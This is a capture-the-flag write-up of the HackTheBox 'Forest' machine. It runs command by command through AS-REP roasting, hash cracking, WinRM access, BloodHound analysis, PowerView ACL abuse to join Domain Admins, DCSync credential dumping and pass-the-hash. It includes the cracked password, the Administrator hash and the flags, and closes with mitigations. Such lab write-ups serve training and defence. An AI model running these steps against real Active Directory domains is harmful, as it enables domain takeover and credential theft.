# Forest HTB Writeup

**Machine**: Forest  
**Platform**: HackTheBox  
**Difficulty**: Medium  
**OS**: Windows   

## Reconnaissance

### Initial Scan

First, I set the target IP and performed a full port scan:

```bash
export target=10.129.19.180
sudo nmap -p- --min-rate 1000 -sT -vvv $target
```

<img width="456" height="73" alt="image" src="https://github.com/user-attachments/assets/b5030e77-b86f-4075-bb74-eb4d1c8a6edb" />

<img width="494" height="622" alt="image" src="https://github.com/user-attachments/assets/d87ca186-511e-47aa-b82f-f768c16b6baf" />

**Discovered Ports**: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 47001, 49664, 49665, 49666, 49668, 49671, 49676, 49677, 49681, 49698, 50016

### Service Enumeration

```bash
sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49676,49677,49681,49698,50016 -T4 $target
```

<img width="960" height="952" alt="image" src="https://github.com/user-attachments/assets/6037f958-e6fc-42dc-9880-4df86651a82a" />

**Key Findings**:
- Domain: `htb.local`
- Active Directory Environment
- WinRM (5985) open - potential entry point

### DNS Enumeration

Attempted zone transfers but they were blocked:
```bash
dig axfr @10.129.19.180 htb.local
dig axfr @10.129.19.180 forest.htb
```

<img width="522" height="276" alt="image" src="https://github.com/user-attachments/assets/569b00ec-ce59-4bd6-b656-8518c4e7cc34" />

### SMB Enumeration

Anonymous login was successful but no shares were accessible:
```bash
smbclient -N -L //10.129.19.180/
```

<img width="723" height="172" alt="image" src="https://github.com/user-attachments/assets/d1a91cdc-deca-4567-acfd-8539ddb30e02" />

### LDAP Enumeration

```bash
ldapsearch -x -H ldap://10.129.19.180 -s base namingcontexts
```
Discovered base DN: `DC=htb,DC=local`

<img width="732" height="812" alt="image" src="https://github.com/user-attachments/assets/280deba8-e3e5-43c3-8a0c-75180765eaba" />

### RPC Client Enumeration

This revealed the most valuable information - domain users and groups:

```bash
rpcclient -U "" -N 10.129.19.180

# Enumerate users
rpcclient $> enumdomusers
```

<img width="686" height="718" alt="image" src="https://github.com/user-attachments/assets/83b15162-85d9-475e-9106-292fe635395c" />

**Discovered Users**:
- Administrator
- Guest
- krbtgt
- svc-alfresco
- sebastien
- lucinda
- andy
- mark
- santi
- Several service accounts

**Discovered Groups**:
- Domain Admins
- Domain Users
- Enterprise Admins
- Service Accounts
- Privileged IT Accounts
- Exchange Windows Permissions

## Initial Foothold

### AS-REP Roasting Attack

Since we discovered multiple users, I attempted AS-REP Roasting:

```bash
# Create users list from rpcclient output
echo "Administrator" > users
echo "Guest" >> users
echo "krbtgt" >> users
echo "svc-alfresco" >> users
echo "sebastien" >> users
echo "lucinda" >> users
echo "andy" >> users
echo "mark" >> users
echo "santi" >> users

# Perform AS-REP Roasting
for i in $(cat users); do 
    impacket-GetNPUsers -no-pass -dc-ip 10.129.19.180 HTB.LOCAL/${i} | grep -v Impacket 2>/dev/null 
done
```

**Success!** User `svc-alfresco` had Kerberos pre-authentication disabled and returned a crackable AS-REP hash:

<img width="953" height="136" alt="image" src="https://github.com/user-attachments/assets/623aefa3-8d61-43ed-9465-fca1441bd484" />

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:9cd60576bdc3ac0490a0dd377dbd9977$184fe48cb91e43c670daa1f582ff3848abeff3234fd40845fdec837c759e68f46bce3d2416001d13e1b6e4c0fb41cc27cb63e5610a8b0bb1b89fce6d36a233f44e11484958038feb13f7ee301b0e5d723b4b78fb89f53da369647a0691207f884ebc24c8294e4f2c6e6a5ba5c2fa8ab1c4cdc9f9e21a1fd41210d18320964c31a5eba59a1cf418317195401dfe5cfd7eb2d6a273430599fb76c52dda260b75f96af2d8bf1381765c56c0ef801e158b47d318536227747bb3ceddb83378fa6f4d146336f6f1bbdcc93be6c26bc85c7d0a539cb29813bd9a1584cf32befe1230d196dc023e75be
```

### Password Cracking

Saved the hash to a file and cracked it with hashcat:

```bash
echo '$krb5asrep$23$svc-alfresco@HTB.LOCAL:...' > hash
hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
```

<img width="962" height="895" alt="image" src="https://github.com/user-attachments/assets/7da2cf85-a52f-4468-98b8-d55ee8afe711" />

**Cracked Password**: `s3rvice`

### Initial Access

With valid credentials, I accessed the system via WinRM:

```bash
evil-winrm -i 10.129.19.180 -u svc-alfresco -p 's3rvice'
```

<img width="619" height="627" alt="image" src="https://github.com/user-attachments/assets/151243fa-bca3-4682-8a35-436c0223813d" />

**User Flag**: `101f7af620a48d0d9d74784d7836cccf`

## Privilege Escalation

### BloodHound Setup

To understand the Active Directory environment better, I set up BloodHound:

```bash
# Install BloodHound
sudo apt update && sudo apt install -y docker.io docker-compose
mkdir -p ~/bloodhound && cd ~/bloodhound
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install

# Start BloodHound
./bloodhound-cli start
```

### Data Collection

I needed to collect AD data using SharpHound:

```bash
# On attacker machine - start SMB server
impacket-smbserver share . -smb2support -username ara -password ara

# On victim machine via Evil-WinRM
net use \\10.10.14.142\share /u:ara ara
copy \\10.10.14.142\share\SharpHound.exe
.\SharpHound.exe

# After collection, transfer back to attacker
copy 20251105051325_BloodHound.zip \\10.10.14.142\share\blood.zip
```

<img width="823" height="228" alt="image" src="https://github.com/user-attachments/assets/7dddfb39-388e-4a03-b36e-235816e56099" />

### BloodHound Analysis

The analysis revealed a critical attack path:
1. `svc-alfresco` is member of `Service Accounts`
2. `Service Accounts` is member of `Privileged IT Accounts`
3. `Privileged IT Accounts` has `WriteDACL` on `Domain Admins` group

<img width="1400" height="437" alt="image" src="https://github.com/user-attachments/assets/3fd2ffe2-ebf9-45b4-a14e-4ea19d7ac3c7" />

This means we can modify the Domain Admins group permissions!

### ACL Abuse Attack

Using PowerView, I exploited the WriteDACL permission:

```powershell
# Load PowerView (uploaded via SMB)
. .\PowerView.ps1

# Create credential object
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $SecPassword)

# Step 1: Add WriteMembers permission to Domain Admins group
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers

# Step 2: Add ourselves to Domain Admins group
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'svc-alfresco' -Credential $Cred

# Verify we're now in Domain Admins
Get-DomainGroupMember -Identity 'Domain Admins'
```

### Domain Compromise via DCSync

With Domain Admin privileges, I performed DCSync to extract all password hashes:

```bash
impacket-secretsdump svc-alfresco:s3rvice@10.129.19.180
```

<img width="853" height="550" alt="image" src="https://github.com/user-attachments/assets/4f1ac107-0a0f-4234-a571-e56fee6d5f42" />

**Administrator Hash Extracted**:
```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

### Root Access

Finally, I used Pass-the-Hash to gain Administrator access:

```bash
evil-winrm -i 10.129.19.180 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
```

<img width="697" height="648" alt="image" src="https://github.com/user-attachments/assets/9744279c-349d-46a9-8e65-ed7df642e2ca" />

**Root Flag**: `3d82964c9f5150ec7c13ac4ec2115ea8`

## Attack Summary

1. **Reconnaissance**: Discovered domain users via RPC enumeration
2. **Initial Access**: AS-REP Roasting on svc-alfresco → Password cracking → WinRM access
3. **Privilege Escalation**: BloodHound analysis → ACL abuse → Added to Domain Admins
4. **Domain Compromise**: DCSync → Extracted Administrator hash → Pass-the-Hash

## Security Issues & Mitigations

### Vulnerabilities Identified:
1. **AS-REP Roasting**: User with pre-authentication disabled
2. **Weak Service Account Password**: Easily crackable password
3. **Excessive Group Permissions**: Privileged IT Accounts had unnecessary WriteDACL on Domain Admins

### Recommended Mitigations:
1. Enable Kerberos pre-authentication for all users
2. Implement strong password policies for service accounts
3. Apply principle of least privilege for group permissions
4. Regularly audit ACLs and group memberships
5. Monitor for DCSync attacks and unusual group modifications

## Tools Used
- **nmap**: Network scanning
- **rpcclient**: User enumeration
- **impacket**: AS-REP Roasting, DCSync, SMB server
- **hashcat**: Password cracking
- **evil-winrm**: Remote access
- **BloodHound**: AD privilege escalation analysis
- **PowerView**: AD exploitation

This comprehensive approach demonstrates the importance of proper Active Directory configuration and the dangers of excessive permissions in enterprise environments.

<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00c8ff; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00c8ff; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00c8ff; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00c8ff; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00c8ff; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00c8ff; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00c8ff; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00c8ff; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00c8ff; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00c8ff; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style> 
